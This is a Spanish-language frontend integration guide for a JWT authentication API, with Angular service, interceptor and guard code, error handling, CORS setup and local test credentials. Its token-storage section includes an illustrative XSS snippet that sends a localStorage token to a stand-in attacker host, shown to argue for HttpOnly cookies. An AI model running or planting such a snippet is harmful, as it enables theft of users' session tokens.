# 🔌 Guía de Integración Frontend - WOM Auth Service API

> **Documentación para desarrolladores Frontend (Angular)** sobre cómo integrar con el servicio de autenticación WOM.

---

## 📋 Tabla de Contenido

1. [Información General](#información-general)
2. [Documentación OpenAPI/Swagger](#documentación-openapiswagger)
3. [Endpoints Disponibles](#endpoints-disponibles)
4. [Modelos de Datos (DTOs)](#modelos-de-datos-dtos)
5. [Autenticación JWT](#autenticación-jwt)
6. [Códigos de Estado HTTP](#códigos-de-estado-http)
7. [Manejo de Errores](#manejo-de-errores)
8. [Flujo de Autenticación Recomendado](#flujo-de-autenticación-recomendado)
9. [Almacenamiento de Tokens - Recomendación de Seguridad](#almacenamiento-de-tokens---recomendación-de-seguridad)
10. [CORS](#cors)
11. [Rate Limiting](#rate-limiting)
12. [Credenciales de Prueba](#credenciales-de-prueba)
13. [Ejemplos de Código Angular](#ejemplos-de-código-angular)
14. [Generación Automática de Cliente](#generación-automática-de-cliente)
15. [Troubleshooting](#troubleshooting)

---

## 📡 Información General

### Base URLs

| Ambiente | URL | Descripción |
|----------|-----|-------------|
| **Desarrollo** | `http://localhost:8080` | Servidor local con Docker |
| **Producción** | `https://api.tudominio.com` | ⚠️ Configurar según despliegue |

### Versión API
- **Versión actual**: 1.0.0
- **Compatibilidad**: Java 17, Spring Boot 2.7.18
- **Documentación**: OpenAPI 3.0

---

## 📚 Documentación OpenAPI/Swagger

### Swagger UI (Interactivo) ⭐

La forma **más fácil** de entender la API es usar Swagger UI:

```
http://localhost:8080/swagger-ui/index.html
```

**Características:**
- ✅ Documentación interactiva de todos los endpoints
- ✅ Prueba endpoints directamente desde el navegador
- ✅ Ejemplos de request/response
- ✅ Schemas completos de todos los DTOs
- ✅ Códigos de estado HTTP y descripciones

### Especificación OpenAPI

Para generación automática de código o herramientas como Postman:

```bash
# Formato JSON
http://localhost:8080/v3/api-docs

# Formato YAML (recomendado para generadores)
http://localhost:8080/v3/api-docs.yaml
```

**Descargar especificación:**
```bash
# YAML
curl http://localhost:8080/v3/api-docs.yaml > wom-auth-api.yaml

# JSON
curl http://localhost:8080/v3/api-docs > wom-auth-api.json
```

---

## 🔌 Endpoints Disponibles

### Resumen de Endpoints

| Endpoint | Método | Auth Requerido | Descripción |
|----------|--------|----------------|-------------|
| `/auth/login` | POST | ❌ No | Autenticar usuario y obtener tokens |
| `/auth/refresh` | POST | ❌ No | Renovar access token usando refresh token |
| `/auth/logout` | POST | ✅ Sí | Cerrar sesión e invalidar refresh token actual |
| `/auth/logout-all` | POST | ✅ Sí | Cerrar sesión en todos los dispositivos |
| `/auth/me` | GET | ✅ Sí | Obtener perfil del usuario autenticado |

### Endpoints de Monitoreo (Opcional)

| Endpoint | Descripción |
|----------|-------------|
| `/actuator/health` | Estado de salud del servicio |
| `/actuator/metrics` | Métricas de la aplicación |

---

## 📦 Modelos de Datos (DTOs)

### 1. LoginRequest

**Endpoint:** `POST /auth/login`

```typescript
interface LoginRequest {
  identifier: string;  // Email o username del usuario
  password: string;    // Contraseña en texto plano (se envía por HTTPS)
}
```

**Ejemplo:**
```json
{
  "identifier": "admin@test.com",
  "password": "password"
}
```

**Validaciones:**
- `identifier`: Requerido, no vacío
- `password`: Requerido, no vacío

---

### 2. LoginResponse

**Respuesta de:** `POST /auth/login`

```typescript
interface LoginResponse {
  accessToken: string;   // JWT para autenticar peticiones (corta duración)
  refreshToken: string;  // Token para renovar el accessToken (larga duración)
  tokenType: string;     // Siempre "Bearer"
  expiresIn: number;     // Segundos hasta que expire el accessToken (900 = 15 min)
}
```

**Ejemplo:**
```json
{
  "accessToken": "eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNz...",
  "refreshToken": "eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoicmVmcmVzaC...",
  "tokenType": "Bearer",
  "expiresIn": 900
}
```

---

### 3. RefreshTokenRequest

**Endpoint:** `POST /auth/refresh`

```typescript
interface RefreshTokenRequest {
  refreshToken: string;  // El refresh token recibido en login
}
```

**Ejemplo:**
```json
{
  "refreshToken": "eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoicmVmcmVzaC..."
}
```

---

### 4. RefreshTokenResponse

**Respuesta de:** `POST /auth/refresh`

```typescript
interface RefreshTokenResponse {
  accessToken: string;   // Nuevo JWT para autenticar peticiones
  refreshToken: string;  // Nuevo refresh token (rotación automática)
  tokenType: string;     // Siempre "Bearer"
  expiresIn: number;     // Segundos hasta que expire el nuevo accessToken
}
```

**⚠️ Importante:** El backend implementa **rotación de refresh tokens**. Cada vez que refrescas, recibes un **nuevo** refresh token. Debes actualizar ambos tokens en tu storage.

---

### 5. LogoutRequest

**Endpoint:** `POST /auth/logout`

```typescript
interface LogoutRequest {
  refreshToken: string;  // El refresh token a invalidar
}
```

**Ejemplo:**
```json
{
  "refreshToken": "eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoicmVmcmVzaC..."
}
```

---

### 6. UserResponse

**Respuesta de:** `GET /auth/me`

```typescript
interface UserResponse {
  id: number;             // ID único del usuario
  email: string;          // Email del usuario
  username: string;       // Nombre de usuario
  fullName: string;       // Nombre completo
  status: UserStatus;     // Estado de la cuenta
  createdAt: string;      // Fecha de creación (ISO 8601)
  lastLoginAt: string;    // Última fecha de login (ISO 8601)
}

enum UserStatus {
  ACTIVE = "ACTIVE",
  INACTIVE = "INACTIVE",
  LOCKED = "LOCKED"
}
```

**Ejemplo:**
```json
{
  "id": 1,
  "email": "admin@test.com",
  "username": "admin",
  "fullName": "Administrator User",
  "status": "ACTIVE",
  "createdAt": "2025-10-01T10:00:00",
  "lastLoginAt": "2025-10-04T08:30:00"
}
```

---

### 7. ErrorResponse

**Respuesta en caso de error:**

```typescript
interface ErrorResponse {
  path: string;        // Endpoint que generó el error
  error: string;       // Tipo de error (Unauthorized, Bad Request, etc.)
  message: string;     // Mensaje descriptivo del error
  timestamp: string;   // Timestamp del error (ISO 8601)
  status: number;      // Código HTTP de estado
}
```

**Ejemplo:**
```json
{
  "path": "/auth/login",
  "error": "Unauthorized",
  "message": "Invalid credentials",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 401
}
```

---

## 🔐 Autenticación JWT

### Formato del Header

Para **todos los endpoints protegidos** (marcados con ✅ en la tabla), debes incluir:

```http
Authorization: Bearer <accessToken>
```

**Ejemplo:**
```http
GET /auth/me HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNz...
```

### Características de los Tokens

| Token | Duración | Uso | Almacenamiento Recomendado |
|-------|----------|-----|---------------------------|
| **Access Token** | 15 minutos (900s) | Autenticar peticiones a endpoints protegidos | Cookie HttpOnly + Secure |
| **Refresh Token** | 7 días (604800s) | Renovar access token cuando expira | Cookie HttpOnly + Secure |

### Algoritmo

- **Algoritmo**: RS256 (RSA con SHA-256)
- **Tipo**: Asimétrico (clave privada para firmar, pública para verificar)
- **Claims incluidos**:
  ```json
  {
    "type": "access",        // o "refresh"
    "userId": 1,
    "email": "admin@test.com",
    "username": "admin",
    "sub": "admin",
    "iat": 1759563294,       // Issued at
    "exp": 1759564194        // Expiration
  }
  ```

### Estructura del JWT

```
eyJhbGciOiJSUzI1NiJ9           ← Header (algoritmo)
.
eyJ0eXBlIjoiYWNjZXNzIi...      ← Payload (claims/datos)
.
SYNUM2HbS9DX4wuD6IHgVf...      ← Signature (firma digital)
```

**⚠️ Importante:** NO almacenar información sensible en el token. Aunque está firmado, el payload es **legible** (base64).

---

## 📊 Códigos de Estado HTTP

### Respuestas Exitosas

| Código | Descripción | Cuándo |
|--------|-------------|--------|
| `200 OK` | Operación exitosa | Login, refresh, logout, obtener perfil |

### Respuestas de Error

| Código | Descripción | Cuándo | Acción Recomendada |
|--------|-------------|--------|-------------------|
| `400 Bad Request` | Validación fallida | Campos vacíos, formato incorrecto | Mostrar mensaje al usuario |
| `401 Unauthorized` | No autorizado | Credenciales inválidas, token expirado/inválido | Redirigir a login |
| `403 Forbidden` | Prohibido | Cuenta bloqueada, cuenta inactiva | Mostrar mensaje específico |
| `429 Too Many Requests` | Rate limit | Demasiados intentos de login | Mostrar mensaje "intenta más tarde" |
| `500 Internal Server Error` | Error del servidor | Error inesperado en backend | Mostrar mensaje genérico, reportar error |

---

## ⚠️ Manejo de Errores

### 1. Credenciales Inválidas (401)

```json
{
  "path": "/auth/login",
  "error": "Unauthorized",
  "message": "Invalid credentials",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 401
}
```

**Manejo recomendado:**
```typescript
if (error.status === 401 && error.error.message === 'Invalid credentials') {
  this.showError('Usuario o contraseña incorrectos');
}
```

---

### 2. Token Expirado (401)

```json
{
  "path": "/auth/me",
  "error": "Unauthorized",
  "message": "JWT expired",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 401
}
```

**Manejo recomendado:**
```typescript
if (error.status === 401 && error.error.message.includes('expired')) {
  // Intentar refresh automático
  this.authService.refresh().subscribe(
    () => this.retryRequest(),
    () => this.router.navigate(['/login'])
  );
}
```

---

### 3. Usuario Bloqueado (403)

```json
{
  "path": "/auth/login",
  "error": "Forbidden",
  "message": "Account is locked due to multiple failed attempts. Try again in 30 minutes.",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 403
}
```

**Manejo recomendado:**
```typescript
if (error.status === 403) {
  this.showError(error.error.message); // Mostrar mensaje exacto del backend
}
```

---

### 4. Rate Limit Excedido (429)

```json
{
  "path": "/auth/login",
  "error": "Too Many Requests",
  "message": "Rate limit exceeded. Try again later.",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 429
}
```

**Manejo recomendado:**
```typescript
if (error.status === 429) {
  this.showError('Demasiados intentos. Por favor, intenta más tarde.');
  this.disableLoginButton(60); // Deshabilitar botón por 60 segundos
}
```

---

### 5. Validación Fallida (400)

```json
{
  "path": "/auth/login",
  "error": "Bad Request",
  "message": "Validation failed",
  "timestamp": "2025-10-04T10:30:00.123456789",
  "status": 400
}
```

**Manejo recomendado:**
```typescript
if (error.status === 400) {
  this.showError('Por favor, completa todos los campos correctamente');
}
```

---

## 🔄 Flujo de Autenticación Recomendado

### Diagrama de Flujo

```
┌─────────────────────────────────────────────────────────────┐
│                    1. LOGIN                                  │
│  POST /auth/login { identifier, password }                  │
│  ↓                                                           │
│  ✅ 200 OK: { accessToken, refreshToken, ... }              │
│  ❌ 401: Credenciales inválidas                             │
│  ❌ 403: Cuenta bloqueada                                   │
│  ❌ 429: Rate limit                                         │
│                                                              │
│  → Guardar accessToken y refreshToken en Cookie HttpOnly    │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                 2. PETICIONES PROTEGIDAS                     │
│  GET /auth/me                                                │
│  Header: Authorization: Bearer <accessToken>                 │
│  ↓                                                           │
│  ✅ 200 OK: { user data }                                   │
│  ❌ 401: Token expirado/inválido → ir a paso 3              │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│              3. REFRESH TOKEN (Automático)                   │
│  POST /auth/refresh { refreshToken }                         │
│  ↓                                                           │
│  ✅ 200 OK: { accessToken, refreshToken, ... }              │
│     → Actualizar tokens en Cookie                           │
│     → Reintentar petición original                          │
│  ❌ 401: Refresh token inválido/expirado                    │
│     → Borrar tokens                                         │
│     → Redirigir a /login                                    │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                     4. LOGOUT                                │
│  POST /auth/logout { refreshToken }                          │
│  ↓                                                           │
│  → Borrar tokens de Cookie                                  │
│  → Redirigir a /login                                       │
└─────────────────────────────────────────────────────────────┘
```

### Implementación Paso a Paso

#### Paso 1: Login
```typescript
login(identifier: string, password: string) {
  return this.http.post<LoginResponse>('/auth/login', { identifier, password })
    .pipe(
      tap(response => {
        // ⚠️ Ver sección "Almacenamiento de Tokens" para implementación segura
        this.saveTokens(response.accessToken, response.refreshToken);
      })
    );
}
```

#### Paso 2: Adjuntar Token en Peticiones
```typescript
// HTTP Interceptor
intercept(req: HttpRequest<any>, next: HttpHandler) {
  const token = this.getAccessToken(); // Leer de Cookie
  
  if (token) {
    req = req.clone({
      setHeaders: {
        Authorization: `Bearer ${token}`
      }
    });
  }
  
  return next.handle(req).pipe(
    catchError(error => {
      if (error.status === 401 && error.error.message.includes('expired')) {
        // Token expirado, intentar refresh
        return this.handle401Error(req, next);
      }
      return throwError(error);
    })
  );
}
```

#### Paso 3: Refresh Automático
```typescript
private handle401Error(req: HttpRequest<any>, next: HttpHandler) {
  if (!this.isRefreshing) {
    this.isRefreshing = true;
    this.refreshTokenSubject.next(null);

    const refreshToken = this.getRefreshToken();
    
    return this.authService.refresh(refreshToken).pipe(
      switchMap((response) => {
        this.isRefreshing = false;
        this.saveTokens(response.accessToken, response.refreshToken);
        this.refreshTokenSubject.next(response.accessToken);
        
        // Reintentar petición original con nuevo token
        return next.handle(this.addToken(req, response.accessToken));
      }),
      catchError(error => {
        this.isRefreshing = false;
        this.authService.logout();
        return throwError(error);
      })
    );
  }
}
```

#### Paso 4: Logout
```typescript
logout() {
  const refreshToken = this.getRefreshToken();
  
  return this.http.post('/auth/logout', { refreshToken })
    .pipe(
      finalize(() => {
        this.clearTokens();
        this.router.navigate(['/login']);
      })
    );
}
```

---

## 🔒 Almacenamiento de Tokens - Recomendación de Seguridad

### ⚠️ Importante: NO usar localStorage

El documento de la prueba técnica menciona `localStorage`, pero **NO es la opción más segura**. Aquí está el por qué:

### Comparación de Métodos

| Método | Seguridad | Ventajas | Desventajas | Recomendado |
|--------|-----------|----------|-------------|-------------|
| **localStorage** | ❌ Vulnerable a XSS | Fácil de usar, persistente | Accesible por JavaScript malicioso, sin protección | ❌ **NO** |
| **sessionStorage** | ❌ Vulnerable a XSS | Fácil de usar, se limpia al cerrar | Accesible por JavaScript malicioso, no persiste | ❌ **NO** |
| **Cookies HttpOnly + Secure** | ✅ Seguro | Inmune a XSS, automático en requests | Más complejo de implementar | ✅ **SÍ** |

### Por qué NO localStorage:

```typescript
// ❌ VULNERABLE A XSS (Cross-Site Scripting)
localStorage.setItem('accessToken', token);

// Si un atacante inyecta JavaScript malicioso:
<script>
  fetch('https://atacante.com/robar', {
    method: 'POST',
    body: localStorage.getItem('accessToken') // ¡Token robado!
  });
</script>
```

**Vulnerabilidades:**
1. **XSS (Cross-Site Scripting)**: Cualquier script puede leer localStorage
2. **No expira automáticamente**: Token persiste incluso después de cerrar navegador
3. **Sin protección CSRF**: Tokens pueden ser usados en peticiones cross-site

### ✅ Recomendación: Cookies HttpOnly + Secure

#### Configuración en el Backend (Node.js/Express de BFF)

Si usas un BFF (Backend-For-Frontend) entre Angular y el Auth Service:

```typescript
// Backend BFF (Node.js/Express)
app.post('/auth/login', async (req, res) => {
  // Llamar al Auth Service Java
  const response = await axios.post('http://localhost:8080/auth/login', req.body);
  
  // Guardar tokens en cookies HttpOnly
  res.cookie('accessToken', response.data.accessToken, {
    httpOnly: true,    // ✅ No accesible por JavaScript
    secure: true,      // ✅ Solo HTTPS en producción
    sameSite: 'strict', // ✅ Protección CSRF
    maxAge: 15 * 60 * 1000 // 15 minutos
  });
  
  res.cookie('refreshToken', response.data.refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 días
  });
  
  res.json({ success: true });
});
```

#### Configuración en Angular

```typescript
// auth.service.ts
login(identifier: string, password: string) {
  // Llamar al BFF, no directamente al Auth Service
  return this.http.post('/bff/auth/login', { identifier, password }, {
    withCredentials: true  // ✅ Incluir cookies en request
  });
}

// Las cookies se envían automáticamente en cada petición
getProfile() {
  return this.http.get('/bff/auth/me', {
    withCredentials: true  // ✅ Incluir cookies automáticamente
  });
}
```

### Alternativa: localStorage con Precauciones

Si **DEBES** usar localStorage (por simplicidad o requerimiento del proyecto):

```typescript
// ⚠️ SOLO si no puedes implementar cookies HttpOnly

// 1. Validación estricta de contenido (prevenir XSS)
// 2. Content Security Policy (CSP) headers
// 3. Sanitización de inputs
// 4. Tokens de corta duración

// Ejemplo con validación
saveToken(token: string) {
  // Validar formato JWT básico
  if (!token.match(/^[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*$/)) {
    throw new Error('Invalid token format');
  }
  localStorage.setItem('accessToken', token);
}
```

### Documentación para README del Frontend

**Incluir esta sección en el README del proyecto Angular:**

```markdown
## 🔒 Seguridad: Almacenamiento de Tokens

### ⚠️ Importante: localStorage vs Cookies HttpOnly

Este proyecto usa **localStorage** para almacenar tokens JWT según 
los requisitos de la prueba técnica. Sin embargo, es importante 
notar que esta NO es la opción más segura para producción.

### Por qué localStorage NO es ideal:

1. **Vulnerable a XSS (Cross-Site Scripting)**
   - Cualquier script malicioso puede acceder a localStorage
   - Tokens pueden ser robados mediante inyección de código

2. **Sin protección contra CSRF**
   - Tokens persisten indefinidamente hasta ser borrados
   - No hay expiración automática de sesión

### Recomendación para Producción:

**Usar Cookies HttpOnly + Secure** mediante un BFF (Backend-For-Frontend):

```typescript
// Ventajas:
✅ Inmune a ataques XSS (JavaScript no puede leer la cookie)
✅ Protección CSRF con sameSite='strict'
✅ Expiración automática
✅ Más seguro para aplicaciones enterprise

// Implementación:
1. Crear BFF (Node.js/Express) entre Angular y Auth Service
2. BFF guarda tokens en cookies HttpOnly
3. Angular hace peticiones al BFF con withCredentials: true
4. Cookies se envían automáticamente en cada request
```

### Implementación Actual (localStorage)

Por simplicidad y para cumplir con los requisitos de la prueba, 
este proyecto usa localStorage:

```typescript
// auth.service.ts
private saveTokens(accessToken: string, refreshToken: string) {
  localStorage.setItem('accessToken', accessToken);
  localStorage.setItem('refreshToken', refreshToken);
}
```

**Medidas de seguridad implementadas:**
- ✅ Content Security Policy (CSP) headers
- ✅ Sanitización de inputs
- ✅ Validación de formato de tokens
- ✅ Tokens de corta duración (15 min access, 7 días refresh)
```

---

## 🌐 CORS

### Orígenes Permitidos

El backend tiene CORS configurado para los siguientes orígenes:

**Desarrollo:**
```
http://localhost:4200  (Angular CLI default)
http://localhost:3000  (React/Next.js default)
```

**Producción:**
```
Configurar según dominio de producción
```

### Configuración

Si necesitas agregar un nuevo origen, edita el archivo `.env` del backend:

```bash
# .env
CORS_ALLOWED_ORIGINS=http://localhost:4200,http://localhost:3000,https://tudominio.com
```

Luego reinicia el servicio:
```bash
docker-compose down
docker-compose up -d --build
```

### Verificar CORS

```bash
# Verificar headers CORS
curl -I -X OPTIONS http://localhost:8080/auth/login \
  -H "Origin: http://localhost:4200" \
  -H "Access-Control-Request-Method: POST"

# Debe retornar:
# Access-Control-Allow-Origin: http://localhost:4200
# Access-Control-Allow-Methods: POST, GET, ...
```

---

## ⏱️ Rate Limiting

### Límites Configurados

| Endpoint | Límite | Ventana | Acción en Exceso |
|----------|--------|---------|------------------|
| `/auth/login` | 5 intentos fallidos | Por IP | Bloqueo de 30 minutos |
| `/auth/refresh` | Sin límite | - | - |
| Otros endpoints | Sin límite | - | - |

### Comportamiento

1. **Usuario con credenciales correctas**: Sin límite
2. **5 intentos fallidos**: Cuenta bloqueada por 30 minutos
3. **Respuesta HTTP 429**: "Too Many Requests"

### Manejo en Frontend

```typescript
// Manejar error 429
if (error.status === 429) {
  const retryAfter = error.headers.get('Retry-After') || 1800; // 30 min default
  this.showError(`Demasiados intentos. Intenta en ${retryAfter / 60} minutos.`);
}
```

---

## 🧪 Credenciales de Prueba

### Usuarios Disponibles

| Email | Username | Password | Status | Descripción |
|-------|----------|----------|--------|-------------|
| `admin@test.com` | `admin` | `password` | ACTIVE | Usuario administrador |
| `user@test.com` | `testuser` | `password` | ACTIVE | Usuario regular |
| `locked@test.com` | `lockeduser` | `password` | LOCKED | Usuario bloqueado (para probar error 403) |

### Ejemplos de Uso

#### Login Exitoso
```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "identifier": "admin@test.com",
    "password": "password"
  }'
```

#### Probar Error 401 (Credenciales Inválidas)
```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "identifier": "admin@test.com",
    "password": "wrongpassword"
  }'
```

#### Probar Error 403 (Usuario Bloqueado)
```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "identifier": "locked@test.com",
    "password": "password"
  }'
```

---

## 💻 Ejemplos de Código Angular

### 1. AuthService Completo

```typescript
// auth.service.ts
import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable } from 'rxjs';
import { tap } from 'rxjs/operators';

interface LoginRequest {
  identifier: string;
  password: string;
}

interface LoginResponse {
  accessToken: string;
  refreshToken: string;
  tokenType: string;
  expiresIn: number;
}

interface UserResponse {
  id: number;
  email: string;
  username: string;
  fullName: string;
  status: string;
  createdAt: string;
  lastLoginAt: string;
}

@Injectable({ providedIn: 'root' })
export class AuthService {
  private readonly API_URL = 'http://localhost:8080/auth';

  constructor(private http: HttpClient) {}

  /**
   * Login con credenciales
   */
  login(identifier: string, password: string): Observable<LoginResponse> {
    return this.http.post<LoginResponse>(`${this.API_URL}/login`, {
      identifier,
      password
    }).pipe(
      tap(response => {
        this.saveTokens(response.accessToken, response.refreshToken);
      })
    );
  }

  /**
   * Renovar access token
   */
  refresh(): Observable<LoginResponse> {
    const refreshToken = this.getRefreshToken();
    
    if (!refreshToken) {
      throw new Error('No refresh token available');
    }

    return this.http.post<LoginResponse>(`${this.API_URL}/refresh`, {
      refreshToken
    }).pipe(
      tap(response => {
        this.saveTokens(response.accessToken, response.refreshToken);
      })
    );
  }

  /**
   * Logout (cierre de sesión)
   */
  logout(): Observable<void> {
    const refreshToken = this.getRefreshToken();
    
    return this.http.post<void>(`${this.API_URL}/logout`, {
      refreshToken
    }).pipe(
      tap(() => this.clearTokens())
    );
  }

  /**
   * Logout en todos los dispositivos
   */
  logoutAll(): Observable<void> {
    const refreshToken = this.getRefreshToken();
    
    return this.http.post<void>(`${this.API_URL}/logout-all`, {
      refreshToken
    }).pipe(
      tap(() => this.clearTokens())
    );
  }

  /**
   * Obtener perfil del usuario autenticado
   */
  getProfile(): Observable<UserResponse> {
    return this.http.get<UserResponse>(`${this.API_URL}/me`);
  }

  /**
   * Verificar si el usuario está autenticado
   */
  isAuthenticated(): boolean {
    const token = this.getAccessToken();
    return !!token && !this.isTokenExpired(token);
  }

  /**
   * Verificar si el token está expirado
   */
  private isTokenExpired(token: string): boolean {
    try {
      const payload = JSON.parse(atob(token.split('.')[1]));
      const expirationDate = new Date(payload.exp * 1000);
      return expirationDate < new Date();
    } catch {
      return true;
    }
  }

  /**
   * Guardar tokens en localStorage
   * ⚠️ Ver sección "Almacenamiento de Tokens" para alternativa más segura
   */
  private saveTokens(accessToken: string, refreshToken: string): void {
    localStorage.setItem('accessToken', accessToken);
    localStorage.setItem('refreshToken', refreshToken);
  }

  /**
   * Obtener access token
   */
  getAccessToken(): string | null {
    return localStorage.getItem('accessToken');
  }

  /**
   * Obtener refresh token
   */
  private getRefreshToken(): string | null {
    return localStorage.getItem('refreshToken');
  }

  /**
   * Limpiar tokens
   */
  private clearTokens(): void {
    localStorage.removeItem('accessToken');
    localStorage.removeItem('refreshToken');
  }
}
```

---

### 2. HTTP Interceptor

```typescript
// auth.interceptor.ts
import { Injectable } from '@angular/core';
import {
  HttpRequest,
  HttpHandler,
  HttpEvent,
  HttpInterceptor,
  HttpErrorResponse
} from '@angular/common/http';
import { Observable, throwError, BehaviorSubject } from 'rxjs';
import { catchError, filter, take, switchMap } from 'rxjs/operators';
import { AuthService } from './auth.service';
import { Router } from '@angular/router';

@Injectable()
export class AuthInterceptor implements HttpInterceptor {
  private isRefreshing = false;
  private refreshTokenSubject: BehaviorSubject<any> = new BehaviorSubject<any>(null);

  constructor(
    private authService: AuthService,
    private router: Router
  ) {}

  intercept(request: HttpRequest<unknown>, next: HttpHandler): Observable<HttpEvent<unknown>> {
    // Agregar token a la petición si existe
    const token = this.authService.getAccessToken();
    
    if (token) {
      request = this.addToken(request, token);
    }

    return next.handle(request).pipe(
      catchError(error => {
        if (error instanceof HttpErrorResponse && error.status === 401) {
          return this.handle401Error(request, next);
        }
        return throwError(() => error);
      })
    );
  }

  private addToken(request: HttpRequest<any>, token: string): HttpRequest<any> {
    return request.clone({
      setHeaders: {
        Authorization: `Bearer ${token}`
      }
    });
  }

  private handle401Error(request: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
    if (!this.isRefreshing) {
      this.isRefreshing = true;
      this.refreshTokenSubject.next(null);

      return this.authService.refresh().pipe(
        switchMap((response: any) => {
          this.isRefreshing = false;
          this.refreshTokenSubject.next(response.accessToken);
          return next.handle(this.addToken(request, response.accessToken));
        }),
        catchError((error) => {
          this.isRefreshing = false;
          this.authService.clearTokens();
          this.router.navigate(['/login']);
          return throwError(() => error);
        })
      );
    } else {
      return this.refreshTokenSubject.pipe(
        filter(token => token != null),
        take(1),
        switchMap(token => {
          return next.handle(this.addToken(request, token));
        })
      );
    }
  }
}
```

**Registro en app.module.ts:**
```typescript
import { HTTP_INTERCEPTORS } from '@angular/common/http';

@NgModule({
  providers: [
    {
      provide: HTTP_INTERCEPTORS,
      useClass: AuthInterceptor,
      multi: true
    }
  ]
})
export class AppModule { }
```

---

### 3. AuthGuard

```typescript
// auth.guard.ts
import { Injectable } from '@angular/core';
import { Router, CanActivate, ActivatedRouteSnapshot, RouterStateSnapshot } from '@angular/router';
import { AuthService } from './auth.service';

@Injectable({ providedIn: 'root' })
export class AuthGuard implements CanActivate {
  constructor(
    private authService: AuthService,
    private router: Router
  ) {}

  canActivate(route: ActivatedRouteSnapshot, state: RouterStateSnapshot): boolean {
    if (this.authService.isAuthenticated()) {
      return true;
    }

    // No autenticado, redirigir a login con URL de retorno
    this.router.navigate(['/login'], {
      queryParams: { returnUrl: state.url }
    });
    
    return false;
  }
}
```

**Uso en routing:**
```typescript
// app-routing.module.ts
const routes: Routes = [
  { path: 'login', component: LoginComponent },
  { 
    path: 'dashboard', 
    component: DashboardComponent,
    canActivate: [AuthGuard]  // ← Ruta protegida
  },
  { 
    path: 'profile', 
    component: ProfileComponent,
    canActivate: [AuthGuard]  // ← Ruta protegida
  }
];
```

---

### 4. Componente de Login

```typescript
// login.component.ts
import { Component } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { Router, ActivatedRoute } from '@angular/router';
import { AuthService } from '../auth.service';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html'
})
export class LoginComponent {
  loginForm: FormGroup;
  loading = false;
  error = '';
  returnUrl = '/dashboard';

  constructor(
    private fb: FormBuilder,
    private authService: AuthService,
    private router: Router,
    private route: ActivatedRoute
  ) {
    this.loginForm = this.fb.group({
      identifier: ['', Validators.required],
      password: ['', Validators.required]
    });

    // Obtener URL de retorno
    this.returnUrl = this.route.snapshot.queryParams['returnUrl'] || '/dashboard';
  }

  onSubmit(): void {
    if (this.loginForm.invalid) {
      return;
    }

    this.loading = true;
    this.error = '';

    const { identifier, password } = this.loginForm.value;

    this.authService.login(identifier, password).subscribe({
      next: () => {
        this.router.navigate([this.returnUrl]);
      },
      error: (error) => {
        this.loading = false;
        
        if (error.status === 401) {
          this.error = 'Usuario o contraseña incorrectos';
        } else if (error.status === 403) {
          this.error = error.error.message; // "Cuenta bloqueada..."
        } else if (error.status === 429) {
          this.error = 'Demasiados intentos. Intenta más tarde.';
        } else {
          this.error = 'Error al iniciar sesión. Intenta nuevamente.';
        }
      }
    });
  }
}
```

```html
<!-- login.component.html -->
<div class="login-container">
  <h2>Iniciar Sesión</h2>
  
  <form [formGroup]="loginForm" (ngSubmit)="onSubmit()">
    <div class="form-group">
      <label for="identifier">Email o Usuario</label>
      <input 
        type="text" 
        id="identifier" 
        formControlName="identifier"
        placeholder="admin@test.com"
        [class.error]="loginForm.get('identifier')?.invalid && loginForm.get('identifier')?.touched"
      />
    </div>

    <div class="form-group">
      <label for="password">Contraseña</label>
      <input 
        type="password" 
        id="password" 
        formControlName="password"
        [class.error]="loginForm.get('password')?.invalid && loginForm.get('password')?.touched"
      />
    </div>

    <div *ngIf="error" class="error-message">
      {{ error }}
    </div>

    <button 
      type="submit" 
      [disabled]="loading || loginForm.invalid"
    >
      {{ loading ? 'Cargando...' : 'Iniciar Sesión' }}
    </button>
  </form>
</div>
```

---

## 🤖 Generación Automática de Cliente

Puedes generar automáticamente un cliente Angular usando la especificación OpenAPI:

### Usando ng-openapi-gen

```bash
# 1. Instalar generador
npm install -g ng-openapi-gen

# 2. Descargar especificación
curl http://localhost:8080/v3/api-docs.yaml > api-spec.yaml

# 3. Generar código
ng-openapi-gen --input api-spec.yaml --output src/app/api

# 4. Usar servicios generados
import { AuthService } from './api/services/auth.service';
```

**Ventajas:**
- ✅ Tipos TypeScript automáticos
- ✅ Servicios completamente tipados
- ✅ Modelos sincronizados con backend
- ✅ Menos propenso a errores

---

## 🔧 Troubleshooting

### 1. Error de CORS

**Síntoma:**
```
Access to XMLHttpRequest at 'http://localhost:8080/auth/login' 
from origin 'http://localhost:4200' has been blocked by CORS policy
```

**Solución:**
```bash
# Verificar que tu origen esté en CORS_ALLOWED_ORIGINS del backend
# Archivo .env:
CORS_ALLOWED_ORIGINS=http://localhost:4200,http://localhost:3000

# Reiniciar backend
docker-compose down
docker-compose up -d
```

---

### 2. Token Expirado Constantemente

**Síntoma:**
- Token expira cada 15 minutos
- Usuario debe hacer login frecuentemente

**Solución:**
- Implementar refresh automático (ver sección "HTTP Interceptor")
- El interceptor debe detectar error 401 y llamar a `/auth/refresh`

---

